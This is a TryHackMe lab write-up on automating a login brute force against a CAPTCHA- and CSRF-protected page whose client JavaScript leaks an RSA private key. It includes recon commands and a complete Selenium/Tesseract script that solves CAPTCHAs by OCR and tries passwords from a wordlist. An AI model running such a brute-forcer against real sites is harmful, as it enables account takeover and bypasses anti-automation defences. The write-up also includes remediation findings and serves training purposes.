# CAPTCHApocalypse — TryHackMe Writeup

> **Platform:** TryHackMe · **Theme:** Web — Client-Side Crypto + Anti-Automation Bypass
> **Goal:** *"When cryptocurrency comes into play, automate the process. Can you guess the admin's password and log into the dashboard?"*
> **Hint:** use the first 100 lines of `rockyou.txt`.
> **Author:** nos010101
>
> Passwords, keys and flags are **partially redacted** throughout.

---

## TL;DR — the kill chain

```
Recon: login page loads crypto-js + node-forge before script.js
      │
      ▼
script.js leaks BOTH RSA keys ──► client-side crypto is theatre
      │                           AND the client private key turns the
      │                           encrypted responses into a plaintext ORACLE
      ▼
Three coupled anti-automation controls:  CSRF ──► CAPTCHA ──► credentials
      │
      ▼
Automate: reload index.php per attempt (fresh csrf+captcha pair)
          let the page's own login() do the RSA
          OCR the captcha  +  read the decrypted verdict
      │
      ▼
Brute first-100 rockyou against admin ──► admin : tink██████
      │
      ▼
dashboard.php ──► THM{8938aed9████████████████████████████}
```

The room is not about "breaking a captcha". It is about **automating a login through three defences that are wired together** — and the twist is that every piece of the site's cryptography works *against* the defender.

---

## 1. Recon

```
nmap -sCV -O -Pn -p- <TARGET>
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp  open  http  Apache httpd 2.4.41 (Ubuntu)   — title: "Login"
```

The app is served on the vhost `captcha.thm` (add it to `/etc/hosts`). The landing page is a login form with a **CAPTCHA**, and the HTML is the first tell:

```html
<script src="./js/crypto-js.min.js"></script>
<script src="./js/forge.min.js"></script>
<script src="script.js"></script>
...
<input type="hidden" name="csrf_token" id="csrf_token" value="...">
<img src="captcha.php" alt="CAPTCHA">
<button type="button" onclick="login()">Login</button>
```

Two crypto libraries (`crypto-js`, `node-forge`) loaded on a *login form* is not incidental — the client is doing cryptography before it talks to the server. Content discovery confirms the moving parts:

```
feroxbuster -u http://captcha.thm/ -w .../directory-list-lowercase-2.3-medium.txt
200  /script.js
200  /captcha.php        (dynamic captcha image)
301  /js/  /css/  /view/
```

> **Why it matters:** a hidden `csrf_token`, a server-rendered captcha, and client-side crypto are **three independent controls**. Any brute-forcer has to satisfy all three on every request.

---

## 2. Analysis — the client (`script.js`)

`script.js` hands us the entire protocol. Two things stand out.

### 2.1 There are two RSA keys — and one of them shouldn't be here

```js
const serverPublicKey  = `-----BEGIN PUBLIC KEY----- ... -----END PUBLIC KEY-----`;
const clientPrivateKey = `-----BEGIN PRIVATE KEY----- ... -----END PRIVATE KEY-----`;  // (!)
```

- **`serverPublicKey`** — used to encrypt the request. The server holds the matching private key. This is expected.
- **`clientPrivateKey`** — a **private** key shipped in client-side JavaScript, used by `decryptData()` to decrypt the *server's response*.

Shipping a private key to the browser is [CWE-321](https://cwe.mitre.org/data/definitions/321.html) (hard-coded cryptographic key). It means an attacker can decrypt everything the server sends back.

### 2.2 The login flow

```js
async function login() {
  const params = new URLSearchParams();
  params.append("action", "login");
  params.append("csrf_token", csrf_token);
  params.append("username", username);
  params.append("password", password);
  params.append("captcha_input", captcha_input);

  const encrypted = encryptData(params.toString());          // RSA w/ serverPublicKey
  const response  = await fetch("server.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ data: encrypted })
  });
  const responseData    = await response.json();
  const decrypted       = decryptData(responseData.data);    // RSA w/ clientPrivateKey
  if (decrypted.includes("Login successful")) location.href = "dashboard.php";
  else if (decrypted.includes("Login failed")) location.href = "index.php?error=true";
  else showError(decrypted);                                 // e.g. "CAPTCHA incorrect."
}
```

`encryptData` uses `forge`'s default scheme — **RSAES-PKCS#1 v1.5**, 2048-bit — then base64. The whole parameter string is encrypted and POSTed to `server.php` as `{"data": "<b64>"}`.

> **Two consequences, both in our favour:**
> 1. **The client is fully reproducible.** Anyone with `serverPublicKey` can encrypt candidate passwords — so the "encryption" adds *zero* confidentiality. It is security theatre ([WSTG-CRYP-04](https://owasp.org/www-project-web-security-testing-guide/), [CWE-603](https://cwe.mitre.org/data/definitions/603.html)).
> 2. **The responses are a plaintext oracle.** Because `clientPrivateKey` is in the page, we can decrypt every verdict the server returns:
>    `Login successful` / `Login failed` / `CAPTCHA incorrect.` / `Invalid CSRF token.`
>    We always know *exactly why* an attempt failed.

This is the same "secret-in-JS → replicate/operate the client" pattern seen in **Domino** (AES key in source) and **Decryptify** (obfuscated secret in `api.js`).

---

## 3. The three controls

| Control | Mechanism | Behaviour discovered | How we satisfy it |
|---|---|---|---|
| **CSRF token** | hidden form field, checked **first** | **single-use** — rotates the instant a captcha is *accepted* | reload the page each attempt → always a fresh token |
| **CAPTCHA** | `captcha.php` image, checked **second** | **regenerated on every fetch** (`$_SESSION['captcha']`) | OCR the exact image tied to this request |
| **Credentials** | checked **last** | standard compare | brute first-100 rockyou |

**Validation order = `CSRF → CAPTCHA → credentials`.** This was deduced from the oracle, not guessed (see §4.2).

### 3.1 The captcha regenerates every fetch

A non-caching client proves it:

```bash
curl -s -c cj http://captcha.thm/ >/dev/null
for i in 1 2 3; do curl -s -b cj http://captcha.thm/captcha.php -o c$i.png; tesseract c$i.png -; done
# => three DIFFERENT values (e.g. 8AESU / 7465F / ROFZC), three different md5sums
```

> **Debugging lesson:** in the browser the captcha *looked* like it persisted across reloads. That was **image caching**, not server state. Always verify server-side behaviour with a client that doesn't cache — not with your eyes in the browser.

So there is no "solve once, spray many" shortcut: the value the POST is checked against is the **last** image `captcha.php` produced for that session.

### 3.2 The CSRF token is single-use

This is the control that quietly voided the first run. Watch the oracle across one long, token-pinned attempt:

```
123456 … 654321   → "CAPTCHA incorrect."     (17×, OCR misses — token still valid)
michael           → "Login failed!"           (captcha PASSED, wrong password)
ashley … (82 more)→ "Invalid CSRF token."     (every request after michael)
```

Reading it mechanically:
- We never saw `Invalid CSRF token` **before** `michael`, but we did see `CAPTCHA incorrect` → CSRF passed first, captcha was checked second.
- The token survived 17 captcha-failures → a mere POST does **not** rotate it.
- The moment a captcha was **accepted** (`michael`), the server regenerated the form nonce → the pinned token went stale → everything afterwards died on CSRF.

```
 token issued ──► [17 captcha-fails: token still OK] ──► captcha PASS (michael) ──► TOKEN ROTATED
                                                                                   │
                                                    all later requests reuse stale token ──► "Invalid CSRF token."
```

> **Consequence:** that first run tested exactly **one** password (`michael`). 17 were lost to OCR, 82 to the dead token. A "finished, no match" result there would have been a **false negative**.

---

## 4. Exploitation — automating the login

### 4.1 Design decision: reload per attempt

The elegant approach — load the page once, then loop `encryptData → fetch(server.php) → decryptData` without navigating — is fast but **pins the CSRF token** and dies after the first captcha-pass.

The robust approach is to **reload `index.php` before every attempt**. A fresh page render delivers a fresh `csrf_token` (hidden field) *and* a fresh captcha (`<img>`) as a matched pair, re-synchronising all session state each iteration. We let the page's own `login()` perform the RSA — no crypto to re-implement — and only OCR the captcha and drive the form.

> Slower, but correct. The "naive" path wins precisely because it stops trusting any state to survive between requests.

### 4.2 Three-way verdict (mirrors `login()`)

| Result | Signal | Action |
|---|---|---|
| success | URL → `dashboard.php` | **stop — flag** |
| wrong password | redirect → `index.php?error=true` (captcha passed) | **next password** |
| captcha / CSRF miss | stays on page, `#error-box` shows text | **retry the SAME password** |

The critical bug in a first draft of this logic was treating *anything that isn't the dashboard* as "wrong password" and moving on — that silently skips passwords whose captcha simply failed OCR. The rule is: **only advance on a definitive server credential verdict (`error=true`); on a captcha miss, `continue`, never `break`.**

### 4.3 OCR reliability

The captcha font is clean (5 chars, uppercase `A–Z` + digits `2–9`; `0`/`1` are avoided by the generator, so excluding them resolves `0↔O` / `1↔I` ambiguity). A single `--psm 7` + fixed threshold only cracked ~15–25 % of images. Two fixes:

- **Gate before submit:** never send a read that isn't exactly 5 alphanumeric chars — a malformed OCR would waste the attempt.
- **Ensemble vote:** OCR each captcha under **4 binarisation thresholds × 3 PSM modes (7/8/13)** and take the majority 5-char result. Most captchas now crack on the first page load.

### 4.4 Instrument what was actually tested

The script counts passwords that **genuinely reached the credential check** (captcha accepted) versus those it never got past the captcha:

```
[i] done. genuinely tested: 86/100
[!] 14 password(s) NEVER reached the credential check: [monkey, tigger, anthony,
    purple, jordan, justin, fuckyou, flower, hello, hottie, tinkerbell, teamo,
    computer, spongebob]
```

Because the hint guarantees the password is in the first 100 rockyou lines, and the 86 tested ones are eliminated by a **hard server verdict**, the answer must be one of those **14**. Re-running just those 14 with the ensemble OCR lands it:

```
[+] FOUND -> admin:tink██████
[+] dashboard says: Welcome, admin — Here is your flag: THM{8938aed9████████████████████████████}
```

> **Methodological win:** the honest *tested/skipped* counter turned a would-be false "not in list" into a precise 14-candidate shortlist. A brute-force is only complete for candidates that actually reached the decision point.

---

## 5. Findings & Remediation

| # | Finding | Severity | CWE / WSTG | Remediation |
|---|---|---|---|---|
| 1 | RSA **private key hard-coded** in client JS (`clientPrivateKey`) | High | CWE-321 / CWE-522 | Keep all private keys server-side; the browser never needs one |
| 2 | **Client-side encryption as a security control** (reproducible with the shipped public key) | Medium | WSTG-CRYP-04 / CWE-603 | Rely on TLS for confidentiality; do server-side validation, not client-side crypto theatre |
| 3 | **Verbose auth oracle** — distinct decrypted verdicts for captcha vs credentials | Low–Med | CWE-204 | Return a single generic error for all failed logins |
| 4 | **OCR-defeatable CAPTCHA** (clean font, no distortion) | Medium | CWE-804 | Use a hardened / modern challenge; add server-side rate limiting |
| 5 | **No rate limiting / lockout** — 100-password brute unimpeded | High | CWE-307 | Per-account throttling, exponential backoff, lockout |
| 6 | Weak credential (`rockyou` top-100) on `admin` | High | CWE-521 | Enforce strong password policy for privileged accounts |

*Note:* the single-use CSRF token (CWE-352 defence) was actually **implemented well** — its rotation is what exposed the token-pinning bug during automation. It is listed here only as a design observation, not a weakness.

---

## 6. Lessons Learned

**Technical**
- **Client-side crypto with keys in the browser is not a control — it's a gift.** The public key makes the "encryption" reproducible; the leaked private key turns responses into a plaintext oracle.
- **Defences are coupled.** Beating the captcha meant nothing while a rotating CSRF token silently invalidated every subsequent request. Map the *order* and *lifecycle* of each control before automating.
- **Verify server state with a non-caching client.** Browser image caching faked "captcha reuse" and sent early analysis down the wrong path.

**Methodological**
- **A "finished, no-match" brute is void if the candidates never passed the pre-checks.** Instrument how many attempts actually reached the real decision, and treat the rest as *untested*, not *negative*.
- **The elegant fast path can hide a coupling.** Re-synchronising all session state each iteration (a full reload) is slower but immune to single-use tokens and regenerating nonces.
- **Read the oracle you're given.** The decrypted verdict string told us the validation order and the exact failure cause for free — no blind guessing.

---

## 7. Tools

- `nmap`, `feroxbuster`, `curl`
- `node` / browser devtools (to read `script.js` and the crypto scheme)
- `Selenium` (Firefox) + `pytesseract` / `tesseract-ocr` + `Pillow`
- (alternative client-replication path) `python3` + `pycryptodome` (`PKCS1_v1_5`)

---

## Appendix — automation script

Full brute-forcer (reload-per-attempt, three-way verdict, ensemble OCR, honest tested/skipped accounting). Run against only the shortlist to finish quickly:

```bash
printf '%s\n' monkey tigger anthony purple jordan justin fuckyou flower \
  hello hottie tinkerbell teamo computer spongebob > remaining.txt
python3 captchapocalypse_brute.py http://captcha.thm --wordlist remaining.txt
```

```python
#!/usr/bin/env python3
"""
CAPTCHApocalypse (TryHackMe) — login brute-forcer.

Full page reload per attempt so a FRESH (csrf, captcha) pair is re-read from the
rendered form every time — the single-use CSRF token then never goes stale.
The page's own login() does all the RSA (forge, PKCS#1 v1.5); we only OCR the
captcha and drive the form, then read the redirect/error to judge the verdict.

Verdict logic (mirrors login()):
  dashboard.php            -> success
  index.php?error=true     -> captcha PASSED, wrong password  -> next password
  stays on page (#error-box)-> captcha/csrf miss              -> RETRY SAME password
"""
import argparse, io, sys, time
import pytesseract
from PIL import Image, ImageEnhance, ImageFilter
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options

CAPTCHA_WHITELIST = "ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789"  # 0/1 excluded (0<->O, 1<->I)
CAPTCHA_LEN = 5
MAX_OCR_RETRIES = 25
VERDICT_TIMEOUT = 10


def ocr_captcha(driver, save_debug=None):
    """Screenshot the captcha <img> and OCR it with a small ensemble + majority vote."""
    from collections import Counter
    img_el = driver.find_element(By.CSS_SELECTOR, "img[alt='CAPTCHA']")
    base = Image.open(io.BytesIO(img_el.screenshot_as_png)).convert("L")
    base = base.resize((base.width * 3, base.height * 3), Image.LANCZOS)
    base = base.filter(ImageFilter.SHARPEN)
    base = ImageEnhance.Contrast(base).enhance(2.0)
    if save_debug:
        base.save(save_debug)
    votes = Counter()
    for thr in (110, 130, 150, 170):
        bw = base.point(lambda p: 0 if p < thr else 255, "1")
        for psm in (7, 8, 13):
            txt = pytesseract.image_to_string(
                bw, config=f"--psm {psm} -c tessedit_char_whitelist={CAPTCHA_WHITELIST}"
            ).strip().replace(" ", "").replace("\n", "").upper()
            if len(txt) == CAPTCHA_LEN and txt.isalnum():
                votes[txt] += 1
    return votes.most_common(1)[0][0] if votes else ""


def wait_verdict(driver, login_url, timeout=VERDICT_TIMEOUT):
    end = time.time() + timeout
    while time.time() < end:
        cur = driver.current_url
        if "dashboard.php" in cur:
            return ("success", cur)
        if "error=true" in cur:
            return ("wrong_pw", cur)
        try:
            eb = driver.find_element(By.ID, "error-box")
            if eb.is_displayed() and eb.text.strip():
                return ("captcha_miss", eb.text.strip())
        except Exception:
            pass
        time.sleep(0.2)
    return ("timeout", driver.current_url)


def main():
    ap = argparse.ArgumentParser(description="CAPTCHApocalypse login brute-forcer")
    ap.add_argument("url")
    ap.add_argument("--wordlist", default="wordlist.txt")
    ap.add_argument("--username", default="admin")
    ap.add_argument("--debug-captchas", action="store_true")
    args = ap.parse_args()

    base = args.url.rstrip("/")
    if not base.startswith(("http://", "https://")):
        base = "http://" + base
    login_url = f"{base}/index.php"

    with open(args.wordlist, "r", encoding="latin-1", errors="ignore") as f:
        passwords = [w.strip() for w in f if w.strip()]
    print(f"[i] loaded {len(passwords)} passwords; target {login_url}; user={args.username!r}")

    if args.debug_captchas:
        import os
        os.makedirs("captchas", exist_ok=True)

    opts = Options()
    opts.add_argument("--headless")
    driver = webdriver.Firefox(options=opts)   # Selenium Manager fetches geckodriver

    tested, skipped = 0, []
    try:
        for pw in passwords:
            verdict = None
            for attempt in range(MAX_OCR_RETRIES):
                driver.get(login_url)          # FRESH csrf + FRESH captcha, paired
                time.sleep(0.3)
                dbg = f"captchas/{pw}_{attempt}.png" if args.debug_captchas else None
                cap = ocr_captcha(driver, save_debug=dbg)
                if len(cap) != CAPTCHA_LEN or not cap.isalnum():
                    continue                   # bad read -> retry with a fresh captcha
                driver.find_element(By.ID, "username").clear()
                driver.find_element(By.ID, "username").send_keys(args.username)
                driver.find_element(By.ID, "password").clear()
                driver.find_element(By.ID, "password").send_keys(pw)
                driver.find_element(By.ID, "captcha_input").clear()
                driver.find_element(By.ID, "captcha_input").send_keys(cap)
                driver.find_element(By.ID, "login-btn").click()

                state, info = wait_verdict(driver, login_url)
                if state == "success":
                    print(f"\n[+] FOUND -> {args.username}:{pw}")
                    try:
                        print("[+] dashboard says:\n" + driver.find_element(By.TAG_NAME, "body").text.strip())
                    except Exception:
                        print("[!] logged in but couldn't read dashboard text")
                    return
                if state == "wrong_pw":
                    tested += 1
                    print(f"[-] {pw:<18} wrong password (captcha ok)")
                    verdict = "wrong_pw"
                    break
                print(f"[!] {pw:<18} captcha miss ({info[:24]!r}) retry {attempt+1}/{MAX_OCR_RETRIES}")

            if verdict != "wrong_pw":
                skipped.append(pw)
                print(f"[x] {pw:<18} NOT TESTED — OCR never cracked the captcha in {MAX_OCR_RETRIES} tries")

        print(f"\n[i] done. genuinely tested: {tested}/{len(passwords)}")
        if skipped:
            print(f"[!] {len(skipped)} password(s) NEVER reached the credential check: {skipped}")
            print("[!] => you CANNOT conclude the password is absent until these are tested.")
        else:
            print("[i] every password reached the credential check; none matched.")
    finally:
        driver.quit()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("\n[!] interrupted")
```

---

*Cross-references: **Domino** (AES key in JS source → forge the client), **Decryptify** (obfuscated secret in `api.js` → operate the client). Recurring pattern: when the secret or the whole crypto scheme lives in the client, you don't break it — you become the client.*

*Writeup by: nos010101*
